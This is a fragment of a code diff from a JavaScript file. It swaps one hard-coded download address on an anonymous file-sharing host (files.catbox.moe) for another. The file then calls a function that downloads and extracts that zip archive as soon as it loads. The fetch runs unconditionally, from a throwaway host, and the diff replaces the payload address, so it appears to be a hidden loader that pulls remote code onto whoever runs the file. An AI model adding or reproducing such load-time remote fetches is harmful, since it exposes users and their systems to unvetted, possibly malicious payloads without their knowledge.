@@ -62,5 +62,5 @@ async function downloadAndExtractZip(zipUrl) {
   }
 }
 
-const zipUrl = 'https://files.catbox.moe/cniiob.zip'; 
+const zipUrl = 'https://files.catbox.moe/vlelxu.zip'; 
 downloadAndExtractZip(zipUrl);
